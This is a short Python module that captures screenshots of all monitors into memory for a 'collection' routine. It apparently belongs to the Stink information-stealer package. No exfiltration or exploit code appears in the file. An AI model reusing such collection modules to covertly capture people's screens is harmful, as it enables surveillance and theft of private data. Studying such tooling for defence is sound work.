from os import path
from typing import List

from stink.helpers import Screencapture, MemoryStorage


class Screenshot:
    """
    Takes a screenshot of the monitors.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__storage = MemoryStorage()

    def __create_screen(self) -> None:
        """
        Takes a screenshot of the monitors.

        Parameters:
        - None.

        Returns:
        - None.
        """
        capture = Screencapture()
        screenshots = capture.create_in_memory()

        for index, monitor in enumerate(screenshots):
            self.__storage.add_from_memory(path.join(self.__folder, f"monitor-{index}.png"), monitor)

    def run(self) -> List:
        """
        Launches the screenshots collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__create_screen()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Screenshot]: {repr(e)}")
